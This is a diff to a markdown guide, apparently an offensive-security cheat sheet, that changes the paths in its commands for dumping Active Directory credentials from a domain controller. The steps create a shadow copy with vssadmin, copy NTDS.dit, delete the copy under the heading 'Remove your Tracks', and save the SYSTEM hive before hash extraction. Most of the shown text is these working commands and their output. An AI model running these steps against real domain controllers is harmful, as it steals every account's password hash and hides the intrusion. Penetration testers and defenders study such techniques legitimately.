@@ -16,7 +16,7 @@ On Domain Controller - create snapshot with `vssadmin.exe`.
 ### Step 1 - Create ShadowCopy
 
 ```plain
-PS C:\temp> vssadmin.exe create shadow /for=C:
+PS C:\> vssadmin.exe create shadow /for=C:
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2013 Microsoft Corp.
 
@@ -28,7 +28,7 @@ Successfully created shadow copy for 'C:\'
 ### Step 2 - Copy NTDS.dit from ShadowCopy
 
 ```plain
-PS C:\temp> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\temp\ntds.dit
+PS C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\ntds.dit
 ```
 
 You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view.html) if you prefer a GUI.
@@ -38,7 +38,7 @@ You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view
 ### Step 3 - Remove your Tracks
 
 ```plain
-PS C:\temp> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
+PS C:\> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
 ```
 
 ### Step 4 - Save the SYSTEM file
@@ -46,7 +46,7 @@ PS C:\temp> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d4
 Save the `SYSTEM` file.
 
 ```plain
-reg SAVE HKLM\SYSTEM c:\temp\SYSTEM
+reg SAVE HKLM\SYSTEM c:\SYSTEM
 ```
 
 ## Extract hashes
